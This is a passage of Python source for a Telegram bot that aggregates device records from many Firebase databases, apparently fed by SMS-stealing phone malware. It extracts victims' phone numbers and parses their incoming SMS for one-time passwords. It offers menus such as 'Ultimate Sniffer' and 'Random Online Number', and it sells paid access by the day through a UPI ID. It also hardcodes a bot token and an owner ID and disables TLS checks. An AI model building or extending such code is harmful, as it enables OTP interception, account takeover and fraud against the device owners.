#!/usr/bin/env python3
"""
Production-Grade Telegram Bot — Multi-Firebase OTP Device Monitor
Architecture: Ultra-Low-RAM (<150MB), Centralized Streaming Sniffer Worker
"""

import os
import sys
import gc
import io
import json
import asyncio
import logging
import re
import html
import time
import hashlib
import random
import warnings
from datetime import datetime
from typing import Any, Callable, Dict, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from enum import Enum, auto

os.environ["CRYPTOGRAPHY_OPENSSL_NO_LEGACY"] = "1"

import httpx

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton,
    Update,
    BotCommand,
    BotCommandScopeChat,
    BotCommandScopeDefault,
    constants,
)
from telegram.ext import (
    Application,
    ApplicationBuilder,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)
from telegram.error import (
    TelegramError,
    NetworkError,
    TimedOut,
    RetryAfter,
    BadRequest,
    Forbidden,
)
from telegram.warnings import PTBUserWarning

warnings.filterwarnings("ignore", category=PTBUserWarning)

# ============================================================================
# Configuration & Constants
# ============================================================================

MENU_BUTTONS = {
    "📱 Show Numbers Menu",
    "🎲 Random Online Number",
    "🔍 Ultimate Sniffer",
    "⭐ Favorites",
    "📑 Duplicate Numbers",
    "🆘 Help",
}

BACKUP_FILE = "bot_backup_data.json"
FIREBASE_URL_REGEX = re.compile(
    r"(?:https?://)?(?:[a-zA-Z0-9\-]+\.)+(?:firebaseio\.com|firebasedatabase\.app)",
    re.IGNORECASE
)

@dataclass(frozen=True)
class BotConfig:
    BOT_TOKEN: str = os.getenv("BOT_TOKEN", "9242197587:AAGwYlvDq6r1AIEjmClQCasSYtr5tuRtG8c")
    OWNER_ID: int = int(os.getenv("OWNER_ID", "8033024853"))
    CHANNEL_USERNAME: str = os.getenv("CHANNEL_USERNAME", "@zvxay_era")
    BOT_USERNAME: str = os.getenv("BOT_USERNAME", "OTPandSMSrobot")

    # Business / Payment  
    UPI_ID: str = "itsanvirajput@okaxis"  
    PRICE_PER_DAY: int = 3
      
    # Firebase  
    PRIMARY_FIREBASE: str = os.getenv(  
        "PRIMARY_FIREBASE",  
        "https://zinga-1ae57-default-rtdb.firebaseio.com"  
    )  
    FIREBASE_TIMEOUT: float = 3.5
    FIREBASE_MAX_RETRIES: int = 1  
      
    # Low-Memory Network Constraints
    HTTP_MAX_CONNECTIONS: int = 12  
    HTTP_MAX_KEEPALIVE_CONNECTIONS: int = 6  
    HTTP_TIMEOUT: float = 3.5  
    CONCURRENT_FETCH_LIMIT: int = 6
      
    # Cache  
    CACHE_TTL: float = 12.0  
    URL_CACHE_TTL: float = 60.0  
    CHANNEL_CACHE_TTL: float = 60.0  
      
    # Intervals  
    POLL_INTERVAL: float = 1.5  
    SNIFFER_INTERVAL: float = 1.0  
    SMS_POLL_MAX_ERRORS: int = 4  
      
    # User Management  
    INITIAL_VALIDITY_HOURS: int = 24  
    REFERRAL_BONUS_HOURS: int = 4  
    MAX_PAUSES_PER_DAY: int = 3  
      
    # UI & Session  
    DEVICES_PER_PAGE: int = 10  
    DEVICE_SESSION_TTL: int = 600  
    SMS_CONVERSATION_TIMEOUT: int = 120  
      
    # Maintenance  
    CACHE_CLEANUP_INTERVAL: int = 15  
    HEALTH_CHECK_INTERVAL: int = 60
    PRUNED_RECHECK_INTERVAL: int = 3600  # 1 Hour

class ConversationState(Enum):
    WAIT_RECIPIENT = auto()
    WAIT_MESSAGE = auto()

# ============================================================================
# Local Backup System
# ============================================================================

class LocalBackupManager:
    @staticmethod
    def load_backup() -> Dict[str, Any]:
        if os.path.exists(BACKUP_FILE):
            try:
                with open(BACKUP_FILE, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception as e:
                logging.error("Failed to read local backup: %s", e)
        return {"firebase_urls": [], "pruned_urls": [], "bot_users": {}}

    @staticmethod
    def save_backup(data: Dict[str, Any]) -> None:
        try:
            with open(BACKUP_FILE, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logging.error("Failed to write local backup: %s", e)

    @classmethod
    def update_key(cls, key: str, value: Any) -> None:
        data = cls.load_backup()
        data[key] = value
        cls.save_backup(data)

    @classmethod
    def update_user(cls, uid: int, user_data: Dict) -> None:
        data = cls.load_backup()
        if "bot_users" not in data:
            data["bot_users"] = {}
        data["bot_users"][str(uid)] = user_data
        cls.save_backup(data)

# ============================================================================
# Logging Configuration
# ============================================================================

def setup_logging() -> logging.Logger:
    logging.basicConfig(
        format="%(asctime)s | %(levelname)-7s | %(name)s | %(message)s",
        level=logging.INFO,
        handlers=[
            logging.StreamHandler(sys.stdout),
        ],
    )
    logging.getLogger("httpx").setLevel(logging.WARNING)  
    logging.getLogger("httpcore").setLevel(logging.WARNING)  
    return logging.getLogger("OTPBot")

logger = setup_logging()

# ============================================================================
# Safe Message Utilities
# ============================================================================

def escape(text: Any) -> str:
    if text is None:
        return ""
    return html.escape(str(text))

async def safe_delete_message(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int) -> None:
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass

async def safe_send_message(
    context: ContextTypes.DEFAULT_TYPE,
    chat_id: int,
    text: str,
    reply_markup: Optional[Any] = None,
    parse_mode: Optional[str] = constants.ParseMode.HTML,
) -> Optional[Any]:
    try:
        return await context.bot.send_message(
            chat_id=chat_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=reply_markup,
        )
    except BadRequest as e:
        if "can't parse entities" in str(e).lower() or "entity" in str(e).lower():
            clean_text = re.sub(r"<[^>]+>", "", text)
            try:
                return await context.bot.send_message(
                    chat_id=chat_id,
                    text=clean_text,
                    parse_mode=None,
                    reply_markup=reply_markup,
                )
            except Exception:
                return None
        return None
    except Exception as e:
        logger.warning("Send message exception: %s", e)
        return None

async def safe_edit_message(
    context: ContextTypes.DEFAULT_TYPE,
    chat_id: int,
    message_id: int,
    text: str,
    reply_markup: Optional[InlineKeyboardMarkup] = None,
    parse_mode: Optional[str] = constants.ParseMode.HTML,
) -> bool:
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            parse_mode=parse_mode,
            reply_markup=reply_markup,
        )
        return True
    except BadRequest as e:
        if "Message is not modified" in str(e):
            return True
        if "can't parse entities" in str(e).lower():
            clean_text = re.sub(r"<[^>]+>", "", text)
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=clean_text,
                    parse_mode=None,
                    reply_markup=reply_markup,
                )
                return True
            except Exception:
                pass
        return False
    except Exception as e:
        logger.warning("Edit message exception: %s", e)
        return False

async def safe_answer_query(query: Any, text: Optional[str] = None, show_alert: bool = False) -> None:
    try:
        await query.answer(text=text, show_alert=show_alert)
    except Exception:
        pass

async def send_file_document(
    context: ContextTypes.DEFAULT_TYPE,
    chat_id: int,
    file_bytes: bytes,
    filename: str,
    caption: str = "",
) -> None:
    try:
        file_obj = io.BytesIO(file_bytes)
        file_obj.name = filename
        await context.bot.send_document(
            chat_id=chat_id,
            document=file_obj,
            filename=filename,
            caption=caption,
            parse_mode=constants.ParseMode.HTML,
        )
    except Exception as e:
        logger.error("Failed to send document: %s", e)

# ============================================================================
# Data Models
# ============================================================================

@dataclass
class UserSession:
    user_id: int
    current_page: int = 0
    active_device: Optional[Tuple[str, str]] = None
    last_sms_id: int = 0
    device_full_data: Dict[str, Dict] = field(default_factory=dict)
    poll_task: Optional[asyncio.Task] = None
    countdown_task: Optional[asyncio.Task] = None
    device_card_msg_id: Optional[int] = None
    device_card_chat_id: Optional[int] = None
    is_in_subfunction: bool = False
    last_fetched_at: float = 0.0
    last_activity: float = field(default_factory=time.time)
    device_key: Optional[str] = None
    device_selected_at: float = 0.0
    tracked_message_ids: List[int] = field(default_factory=list)
    recent_random_keys: List[str] = field(default_factory=list)

    def stop_countdown(self):
        if self.countdown_task and not self.countdown_task.done():
            self.countdown_task.cancel()
            self.countdown_task = None

    def cancel_tasks(self):
        if self.poll_task and not self.poll_task.done():
            self.poll_task.cancel()
            self.poll_task = None
        self.stop_countdown()

    def reset_device_state(self):  
        self.cancel_tasks()
        self.active_device = None  
        self.last_sms_id = 0  
        self.device_key = None  
        self.device_selected_at = 0.0
        self.is_in_subfunction = False
        self.device_card_msg_id = None
        self.device_card_chat_id = None
      
    def update_activity(self):  
        self.last_activity = time.time()

    def touch_session(self):
        self.device_selected_at = time.time()
        self.last_activity = time.time()

    def get_remaining_session_seconds(self) -> int:
        if not self.device_selected_at:
            return 0
        elapsed = int(time.time() - self.device_selected_at)
        return max(0, BotConfig.DEVICE_SESSION_TTL - elapsed)

    def is_device_session_expired(self) -> bool:
        return self.get_remaining_session_seconds() <= 0

# ============================================================================
# OTP Extraction Engine
# ============================================================================

class OTPExtractor:
    PATTERNS = [  
        re.compile(r'\b(\d{4,8})\b'),  
        re.compile(r'(?:OTP|otp|Otp)\s*[:#\-—]?\s*(\d{4,8})', re.IGNORECASE),  
        re.compile(r'(?:code|Code|CODE)\s*[:#\-—]?\s*(\d{4,8})', re.IGNORECASE),  
        re.compile(r'(?:verification|verify)\s*(?:code|number)?\s*[:#\-—]?\s*(\d{4,8})', re.IGNORECASE),  
        re.compile(r'(\d{4,8})\s*(?:is your|is the)\s*(?:OTP|code|verification code)', re.IGNORECASE),  
        re.compile(r'(?:login|access|security|auth)\s*(?:code|key|pin)?\s*[:#\-—]?\s*(\d{4,8})', re.IGNORECASE),  
        re.compile(r'(?:Your|Ur)\s+(?:OTP|otp)\s+is\s+(\d{4,8})', re.IGNORECASE),  
        re.compile(r'(\d{6})\s+is\s+your\s+(?:OTP|otp)', re.IGNORECASE),  
    ]  
    EXCLUDE_PREFIXES = {"19", "20"}  
      
    @classmethod  
    def extract(cls, text: str) -> Optional[str]:  
        if not text:  
            return None  
        for pattern in cls.PATTERNS:  
            match = pattern.search(text)  
            if match:  
                code = match.group(1)  
                if cls._is_valid_otp(code):  
                    return code  
        return None  

    @classmethod  
    def format_html_message(cls, text: str) -> str:  
        otp = cls.extract(text)  
        safe_text = escape(text)  
        if not otp:  
            return safe_text  
          
        safe_otp = escape(otp)  
        formatted = safe_text.replace(safe_otp, f"<b>{safe_otp}</b>", 1)  
        return f"{formatted}\n\n🔑 <code>{safe_otp}</code>"  
      
    @classmethod  
    def _is_valid_otp(cls, code: str) -> bool:  
        if not code or len(code) not in (4, 5, 6, 8):  
            return False  
        if code.startswith(tuple(cls.EXCLUDE_PREFIXES)):  
            return False  
        if len(set(code)) == 1 and len(code) > 3:  
            return False  
        if code in ("1234", "12345", "123456", "12345678"):  
            return False  
        return True

# ============================================================================
# Cache System
# ============================================================================

class TTLCache:
    def __init__(self, ttl: float = 10.0):  
        self._store: Dict[str, Any] = {}  
        self._timestamps: Dict[str, float] = {}  
        self._ttl = ttl  
        self._lock = asyncio.Lock()  
      
    async def get(self, key: str) -> Optional[Any]:  
        async with self._lock:  
            if key not in self._store:  
                return None  
            if (time.monotonic() - self._timestamps.get(key, 0)) >= self._ttl:  
                self._store.pop(key, None)  
                self._timestamps.pop(key, None)  
                return None  
            return self._store[key]  
      
    async def set(self, key: str, value: Any) -> None:  
        async with self._lock:  
            self._store[key] = value  
            self._timestamps[key] = time.monotonic()  
      
    async def invalidate(self, key: str) -> None:  
        async with self._lock:  
            self._store.pop(key, None)  
            self._timestamps.pop(key, None)  

    async def clear(self) -> None:
        async with self._lock:
            self._store.clear()
            self._timestamps.clear()
      
    async def cleanup(self) -> None:  
        async with self._lock:  
            now = time.monotonic()  
            expired = [k for k, ts in self._timestamps.items() if now - ts >= self._ttl]  
            for k in expired:  
                self._store.pop(k, None)  
                self._timestamps.pop(k, None)  

# ============================================================================
# Async HTTP & Firebase Service
# ============================================================================

class HTTPClient:
    def __init__(self, config: BotConfig):  
        self.config = config  
        limits = httpx.Limits(  
            max_connections=config.HTTP_MAX_CONNECTIONS,  
            max_keepalive_connections=config.HTTP_MAX_KEEPALIVE_CONNECTIONS,
            keepalive_expiry=5.0
        )  
        timeout = httpx.Timeout(config.HTTP_TIMEOUT, connect=2.0)  
        self.client = httpx.AsyncClient(limits=limits, timeout=timeout, verify=False)  
      
    def _build_url(self, url: str, path: str, query_params: Optional[str] = None) -> str:
        clean_url = url.strip().rstrip('/')
        if clean_url.endswith('.json'):
            clean_url = clean_url[:-5]
        clean_path = path.strip().strip('/')
        if clean_path.endswith('.json'):
            clean_path = clean_path[:-5]
        base = f"{clean_url}/{clean_path}.json" if clean_path else f"{clean_url}.json"
        if query_params:
            return f"{base}?{query_params}"
        return base

    async def get(self, url: str, path: str, query_params: Optional[str] = None) -> Tuple[Optional[Any], bool]:  
        try:  
            full_url = self._build_url(url, path, query_params)  
            response = await self.client.get(full_url)  
            if response.status_code == 200:  
                return response.json(), False  
            return None, True  
        except Exception:  
            return None, True  
      
    async def patch(self, url: str, path: str, data: Dict) -> bool:  
        try:  
            full_url = self._build_url(url, path)  
            response = await self.client.patch(full_url, json=data)  
            return response.status_code == 200  
        except Exception:  
            return False  
      
    async def close(self) -> None:  
        try:  
            await self.client.aclose()  
        except Exception:  
            pass

class FirebaseService:
    def __init__(self, config: BotConfig, http_client: HTTPClient):  
        self.config = config  
        self.http = http_client  
        self.data_cache = TTLCache(ttl=config.CACHE_TTL)  
        self._url_cache: Optional[List[str]] = None  
        self._url_cache_time: float = 0  
        self._url_lock = asyncio.Lock()  
        self._semaphore = asyncio.Semaphore(config.CONCURRENT_FETCH_LIMIT)
        self._global_clients_cache: Dict[str, Dict] = {}
        self._global_clients_cached_at: float = 0.0
      
    @staticmethod
    def clean_firebase_url(url: str) -> Optional[str]:
        if not isinstance(url, str):
            return None
        url = url.strip().strip('\'"`,;')
        match = FIREBASE_URL_REGEX.search(url)
        if match:
            clean = match.group(0).rstrip('/')
            if not clean.lower().startswith(("http://", "https://")):
                clean = "https://" + clean
            elif clean.lower().startswith("http://"):
                clean = "https://" + clean[7:]
            if clean.endswith('.json'):
                clean = clean[:-5]
            return clean.rstrip('/')
        return None

    @staticmethod
    def is_device_online(info: Dict) -> bool:
        raw_status = info.get("status")
        if raw_status is None:
            raw_status = info.get("online") or info.get("isOnline") or info.get("state")
        
        if isinstance(raw_status, bool):
            return raw_status
        if isinstance(raw_status, (int, float)):
            return raw_status == 1
        if isinstance(raw_status, str):
            return raw_status.strip().lower() in ("true", "1", "online", "connected", "active")
        return False

    async def get_urls(self) -> List[str]:  
        async with self._url_lock:  
            now = time.monotonic()  
            if self._url_cache is not None and (now - self._url_cache_time) < self.config.URL_CACHE_TTL:  
                return self._url_cache  
              
            data, is_err = await self.http.get(  
                self.config.PRIMARY_FIREBASE,  
                "bot_config/firebase_urls"  
            )  
            
            urls = []
            if not is_err and data:
                if isinstance(data, list):
                    for u in data:
                        cleaned = self.clean_firebase_url(str(u))
                        if cleaned and cleaned not in urls:
                            urls.append(cleaned)
                elif isinstance(data, dict):
                    for u in data.values():
                        cleaned = self.clean_firebase_url(str(u))
                        if cleaned and cleaned not in urls:
                            urls.append(cleaned)

            if not urls:
                backup = LocalBackupManager.load_backup()
                urls = backup.get("firebase_urls", [])

            primary_clean = self.clean_firebase_url(self.config.PRIMARY_FIREBASE)
            if primary_clean and primary_clean not in urls:  
                urls.insert(0, primary_clean)  
              
            self._url_cache = urls  
            self._url_cache_time = now  
            LocalBackupManager.update_key("firebase_urls", urls)
            return urls  

    async def get_pruned_urls(self) -> List[str]:
        data, is_err = await self.http.get(self.config.PRIMARY_FIREBASE, "bot_config/pruned_urls")
        cleaned_urls = []
        if isinstance(data, list):
            for u in data:
                clean = self.clean_firebase_url(str(u))
                if clean and clean not in cleaned_urls:
                    cleaned_urls.append(clean)
        if not cleaned_urls:
            backup = LocalBackupManager.load_backup()
            cleaned_urls = backup.get("pruned_urls", [])
        return cleaned_urls

    async def invalidate_url_cache(self) -> None:  
        async with self._url_lock:  
            self._url_cache = None  

    async def prune_dead_urls(self, dead_urls: List[str]) -> None:
        if not dead_urls:
            return
        current_urls = await self.get_urls()
        primary_clean = self.clean_firebase_url(self.config.PRIMARY_FIREBASE)
        existing_pruned = await self.get_pruned_urls()

        new_pruned = list(set(existing_pruned + [self.clean_firebase_url(u) for u in dead_urls if self.clean_firebase_url(u) and self.clean_firebase_url(u) != primary_clean]))
        updated = [u for u in current_urls if u not in dead_urls or u == primary_clean]
        
        if len(updated) != len(current_urls) or len(new_pruned) != len(existing_pruned):
            LocalBackupManager.update_key("firebase_urls", updated)
            LocalBackupManager.update_key("pruned_urls", new_pruned)
            success = await self.patch_data(
                self.config.PRIMARY_FIREBASE,
                "bot_config",
                {"firebase_urls": updated, "pruned_urls": new_pruned},
            )
            if success:
                await self.invalidate_url_cache()

    async def check_and_restore_pruned_urls(self) -> None:
        pruned = await self.get_pruned_urls()
        if not pruned:
            return
        
        restored = []
        still_dead = []
        for url in pruned:
            async with self._semaphore:
                data, is_err = await self.http.get(url, "clients")
            if not is_err and isinstance(data, dict) and len(data) > 0:
                restored.append(url)
            else:
                still_dead.append(url)
        
        if restored:
            async with self._url_lock:
                current_urls = await self.get_urls()
                for r_url in restored:
                    if r_url not in current_urls:
                        current_urls.append(r_url)
                LocalBackupManager.update_key("firebase_urls", current_urls)
                LocalBackupManager.update_key("pruned_urls", still_dead)
                await self.patch_data(
                    self.config.PRIMARY_FIREBASE,
                    "bot_config",
                    {"firebase_urls": current_urls, "pruned_urls": still_dead}
                )
                self._url_cache = current_urls

    async def scan_and_restore_all(
        self,
        progress_callback: Optional[Callable[[int, int, int, int], Any]] = None
    ) -> Tuple[int, int, int]:
        """
        Actively probes both active and pruned endpoints.
        Calls progress_callback(scanned, total, active_so_far, dead_so_far) in real-time.
        Restores working endpoints into the active list.
        """
        async with self._url_lock:
            current_urls = await self.get_urls()
            pruned_urls = await self.get_pruned_urls()
            all_candidate_urls = list(dict.fromkeys(current_urls + pruned_urls))

        total_urls = len(all_candidate_urls)
        active_urls = []
        dead_urls = []
        primary_clean = self.clean_firebase_url(self.config.PRIMARY_FIREBASE)
        scanned_count = 0
        scan_lock = asyncio.Lock()

        async def verify_endpoint(url: str):
            nonlocal scanned_count
            is_working = False
            try:
                async with self._semaphore:
                    data, is_err = await asyncio.wait_for(
                        self.http.get(url, "clients"),
                        timeout=self.config.FIREBASE_TIMEOUT
                    )
                if not is_err and isinstance(data, dict) and len(data) > 0:
                    is_working = True
            except Exception:
                is_working = False

            async with scan_lock:
                scanned_count += 1
                if is_working or (url == primary_clean):
                    active_urls.append(url)
                else:
                    dead_urls.append(url)
                
                if progress_callback:
                    try:
                        res = progress_callback(scanned_count, total_urls, len(active_urls), len(dead_urls))
                        if asyncio.iscoroutine(res):
                            await res
                    except Exception:
                        pass

        await asyncio.gather(*[verify_endpoint(u) for u in all_candidate_urls], return_exceptions=True)

        restored_count = len([u for u in active_urls if u in pruned_urls])
        
        async with self._url_lock:
            LocalBackupManager.update_key("firebase_urls", active_urls)
            LocalBackupManager.update_key("pruned_urls", dead_urls)
            await self.patch_data(
                self.config.PRIMARY_FIREBASE,
                "bot_config",
                {"firebase_urls": active_urls, "pruned_urls": dead_urls}
            )
            self._url_cache = active_urls

        await self.get_all_clients(force_refresh=True)
        return restored_count, len(active_urls), len(dead_urls)
      
    async def get_data(self, url: str, path: str) -> Optional[Any]:  
        cache_key = f"{url}||{path}"  
        cached = await self.data_cache.get(cache_key)  
        if cached is not None:  
            return cached  
          
        async with self._semaphore:
            data, is_err = await self.http.get(url, path)  
        if data is not None:  
            await self.data_cache.set(cache_key, data)  
        return data  
      
    async def patch_data(self, url: str, path: str, data: Dict) -> bool:  
        async with self._semaphore:
            success = await self.http.patch(url, path, data)  
        if success:  
            await self.data_cache.invalidate(f"{url}||{path}")  
        return success  
      
    async def get_user_data(self, uid: int) -> Optional[Dict]:  
        data = await self.get_data(self.config.PRIMARY_FIREBASE, f"bot_users/{uid}")  
        if data:
            LocalBackupManager.update_user(uid, data)
            return data
        backup = LocalBackupManager.load_backup()
        return backup.get("bot_users", {}).get(str(uid))  
      
    async def save_user_data(self, uid: int, data: Dict) -> bool:  
        LocalBackupManager.update_user(uid, data)
        return await self.patch_data(self.config.PRIMARY_FIREBASE, f"bot_users/{uid}", data)  
      
    async def get_user_favorites(self, uid: int) -> List[str]:  
        user_data = await self.get_user_data(uid)  
        if user_data and isinstance(user_data, dict):  
            return user_data.get("favorites", [])  
        return []  
      
    async def get_all_clients(self, session: Optional[UserSession] = None, force_refresh: bool = False) -> Dict[str, Dict]:  
        now = time.time()
        if not force_refresh and (now - self._global_clients_cached_at < self.config.CACHE_TTL) and self._global_clients_cache:
            if session:
                session.device_full_data = self._global_clients_cache
            return self._global_clients_cache

        urls = await self.get_urls()  
          
        async def fetch_one(url: str) -> Tuple[str, Optional[Dict], bool]:  
            try:
                async with self._semaphore:
                    data, is_err = await asyncio.wait_for(self.http.get(url, "clients"), timeout=self.config.FIREBASE_TIMEOUT)
                return url, data, is_err
            except Exception:
                return url, None, True
          
        results = await asyncio.gather(*[fetch_one(url) for url in urls], return_exceptions=True)  
          
        merged: Dict[str, Dict] = {}  
          
        for result in results:  
            if isinstance(result, Exception):  
                continue  
              
            url, clients, is_err = result  
            # Guard Fix: Do NOT auto-prune URLs during browsing or sniffer state transitions.
            if is_err or not isinstance(clients, dict):  
                continue  
              
            for did, info in clients.items():  
                if not isinstance(info, dict):  
                    continue  
                  
                phone = self._extract_phone(info, did)  
                if not phone:  
                    continue  
                  
                unique_key = f"{url}|{did}"  
                short_key = hashlib.md5(unique_key.encode()).hexdigest()[:10]  

                last_seen_ts = info.get("lastSeen") or info.get("timestamp") or info.get("time") or 0
                try:
                    latest_sms_time = int(last_seen_ts)
                except (ValueError, TypeError):
                    latest_sms_time = 0

                cleaned_info = {
                    "_src_url": url,
                    "_original_did": did,
                    "_phone": phone,
                    "_is_online": self.is_device_online(info),
                    "_last_sms_time": latest_sms_time,
                    "battery": info.get("battery", "?"),
                }
                merged[short_key] = cleaned_info  
          
        self._global_clients_cache = merged
        self._global_clients_cached_at = time.time()
        if session:
            session.device_full_data = merged
            session.last_fetched_at = time.time()  

        return merged  
      
    @staticmethod  
    def _extract_phone(info: Dict, did: Optional[str] = None) -> Optional[str]:  
        phone_fields = [  
            'mobNo', 'mobileNo', 'mobilenumber', 'mobile_number',  
            'phoneNumber', 'phoneNo', 'phone_number', 'phonenumber',  
            'phone', 'number', 'simNumber', 'sim1', 'sim2', 'contact',  
        ]  
        for field in phone_fields:  
            value = info.get(field)  
            if not value:  
                continue  
            value = str(value).strip()  
            if value in ('None', 'null', ''):  
                continue  
            cleaned = value.replace('+91', '').replace(' ', '')  
            cleaned = cleaned.replace('-', '').replace('(', '').replace(')', '')  
            if cleaned.isdigit() and len(cleaned) >= 10:  
                return cleaned[-10:]  
            if value.startswith('+') and len(value) >= 11:  
                return value  

        if did:
            cleaned_did = re.sub(r"[^\d]", "", str(did))
            if len(cleaned_did) >= 10:
                return cleaned_did[-10:]

        return None

    async def get_device_phone(self, url: str, did: str) -> str:
        for info in self._global_clients_cache.values():
            if info.get("_src_url") == url and info.get("_original_did") == did:
                phone = info.get("_phone")
                if phone:
                    return phone

        client_data, is_err = await self.http.get(url, f"clients/{did}")
        if not is_err and isinstance(client_data, dict):
            phone = self._extract_phone(client_data, did)
            if phone:
                return phone

        cleaned_did = re.sub(r"[^\d]", "", str(did))
        if len(cleaned_did) >= 10:
            return cleaned_did[-10:]
        return did

# ============================================================================
# User Service & Channel Verification
# ============================================================================

class UserService:
    def __init__(self, config: BotConfig, firebase: FirebaseService):  
        self.config = config  
        self.firebase = firebase  
        self._locks: Dict[int, asyncio.Lock] = {}  
      
    def _get_lock(self, uid: int) -> asyncio.Lock:  
        if uid not in self._locks:  
            self._locks[uid] = asyncio.Lock()  
        return self._locks[uid]  
      
    async def get_or_create(  
        self,  
        uid: int,  
        name: str = "",  
        username: str = "",  
        referrer_id: Optional[int] = None,  
    ) -> Dict:  
        async with self._get_lock(uid):  
            user = await self.firebase.get_user_data(uid)  
            if user and isinstance(user, dict):  
                if username and user.get("username") != username:  
                    user["username"] = username  
                    await self.firebase.save_user_data(uid, user)  
                if referrer_id and not user.get("referred_by") and user.get("user_id") != referrer_id:  
                    user["referred_by"] = referrer_id  
                    await self.firebase.save_user_data(uid, user)  
                return user  
              
            now = int(time.time())  
            user = {  
                "user_id": uid,  
                "first_name": name,  
                "username": username,  
                "valid_until": now + self.config.INITIAL_VALIDITY_HOURS * 3600,  
                "referred_by": referrer_id,  
                "referral_count": 0,  
                "joined_at": now,  
                "paused": False,  
                "pause_count": 0,  
                "pause_date": "",  
                "frozen_seconds": 0,  
                "referred_list": [],  
                "favorites": [],  
            }  
            await self.firebase.save_user_data(uid, user)  
            return user  
      
    async def is_valid(self, uid: int) -> bool:  
        if uid == self.config.OWNER_ID:  
            return True  
        user = await self.firebase.get_user_data(uid)  
        if not user:  
            return False  
        if user.get("paused", False):  
            return user.get("frozen_seconds", 0) > 0  
        return user.get("valid_until", 0) > int(time.time())  
      
    async def get_validity_text(self, uid: int) -> str:  
        if uid == self.config.OWNER_ID:  
            return "♾️ Unlimited"  
        user = await self.firebase.get_user_data(uid)  
        if not user:  
            return "⏳ 24h Free Trial"  
        if user.get("paused", False):  
            frozen = user.get("frozen_seconds", 0)  
            if frozen <= 0:  
                return "⏸️ Paused (Expired)"  
            return self._format_duration(frozen) + " (FROZEN)"  
        remaining = user.get("valid_until", 0) - int(time.time())  
        if remaining <= 0:  
            return "❌ Expired"  
        return self._format_duration(remaining)  
      
    async def pause(self, uid: int) -> Tuple[bool, str]:  
        async with self._get_lock(uid):  
            user = await self.firebase.get_user_data(uid)  
            if not user or uid == self.config.OWNER_ID or user.get("paused", False):  
                return False, "Unable to pause"  
              
            today = datetime.now().strftime("%Y-%m-%d")  
            pause_date = user.get("pause_date", "")  
            pause_count = user.get("pause_count", 0)  
              
            if pause_date == today and pause_count >= self.config.MAX_PAUSES_PER_DAY:  
                return False, f"Used all {self.config.MAX_PAUSES_PER_DAY} pauses today"  
            if pause_date != today:  
                pause_count = 0  
              
            now = int(time.time())  
            current_valid = user.get("valid_until", now)  
            if current_valid <= now:  
                return False, "Cannot pause expired account"  
              
            user["paused"] = True  
            user["frozen_seconds"] = current_valid - now  
            user["pause_count"] = pause_count + 1  
            user["pause_date"] = today  
              
            await self.firebase.save_user_data(uid, user)  
            remaining = self.config.MAX_PAUSES_PER_DAY - (pause_count + 1)  
            return True, f"✅ Paused! {remaining} pauses left today"  
      
    async def resume(self, uid: int) -> Tuple[bool, str]:  
        async with self._get_lock(uid):  
            user = await self.firebase.get_user_data(uid)  
            if not user or not user.get("paused", False):  
                return False, "Already active"  
              
            frozen = user.get("frozen_seconds", 0)  
            now = int(time.time())  
            if frozen <= 0:  
                user["valid_until"] = now  
                user["paused"] = False  
                user["frozen_seconds"] = 0  
                await self.firebase.save_user_data(uid, user)  
                return False, "Time expired while paused"  
              
            user["valid_until"] = now + frozen  
            user["paused"] = False  
            user["frozen_seconds"] = 0  
            await self.firebase.save_user_data(uid, user)  
              
            remaining = user["valid_until"] - now  
            return True, f"✅ Resumed! {self._format_duration(remaining)}"  
      
    async def add_time(self, uid: int, seconds: int, is_lifetime: bool = False) -> bool:  
        async with self._get_lock(uid):  
            user = await self.firebase.get_user_data(uid)  
            if not user:  
                return False  
            now = int(time.time())  
            if is_lifetime:  
                user["valid_until"] = 9999999999  
            elif seconds == 0:  
                user["valid_until"] = now  
            else:  
                current_valid = user.get("valid_until", now)  
                user["valid_until"] = max(current_valid, now) + seconds  
            user["paused"] = False  
            user["frozen_seconds"] = 0  
            return await self.firebase.save_user_data(uid, user)  

    async def set_exact_time(self, uid: int, seconds: int, is_lifetime: bool = False) -> bool:  
        async with self._get_lock(uid):  
            user = await self.firebase.get_user_data(uid)  
            if not user:  
                return False  
            now = int(time.time())  
            if is_lifetime:  
                user["valid_until"] = 9999999999  
            elif seconds == 0:  
                user["valid_until"] = now  
            else:  
                user["valid_until"] = now + seconds  
            user["paused"] = False  
            user["frozen_seconds"] = 0  
            return await self.firebase.save_user_data(uid, user)  
      
    async def process_referral(  
        self,  
        referrer_id: int,  
        new_user_id: int,  
        new_user_name: str,  
        bot_app: Any = None,  
    ) -> None:  
        async with self._get_lock(referrer_id):  
            user = await self.firebase.get_user_data(referrer_id)  
            if not user:  
                return  
            referred_list = user.get("referred_list", [])  
            if new_user_id in referred_list:  
                return  
              
            referred_list.append(new_user_id)  
            user["referred_list"] = referred_list  
            user["referral_count"] = user.get("referral_count", 0) + 1  
              
            bonus_seconds = self.config.REFERRAL_BONUS_HOURS * 3600  
            now = int(time.time())  
            current_valid = user.get("valid_until", now)  
            user["valid_until"] = max(current_valid, now) + bonus_seconds  
            user["paused"] = False  
            user["frozen_seconds"] = 0  
              
            await self.firebase.save_user_data(referrer_id, user)  
              
            if bot_app:  
                try:  
                    notification_text = (  
                        f"🎉 <b>Successful Referral!</b>\n\n"  
                        f"👤 <b>{escape(new_user_name)}</b> joined using your link!\n"  
                        f"🎁 You received <b>+{self.config.REFERRAL_BONUS_HOURS}h Extra Validity</b>.\n"
                        f"▶️ Your timer has been automatically resumed! Click /start to access all devices."  
                    )  
                    await safe_send_message(  
                        bot_app,  
                        referrer_id,  
                        notification_text,  
                        reply_markup=KeyboardBuilder.get_reply_keyboard(),  
                    )  
                except Exception:  
                    pass  
      
    async def get_pause_info(self, uid: int) -> Optional[Dict]:  
        user = await self.firebase.get_user_data(uid)  
        if not user:  
            return None  
        today = datetime.now().strftime("%Y-%m-%d")  
        pause_date = user.get("pause_date", "")  
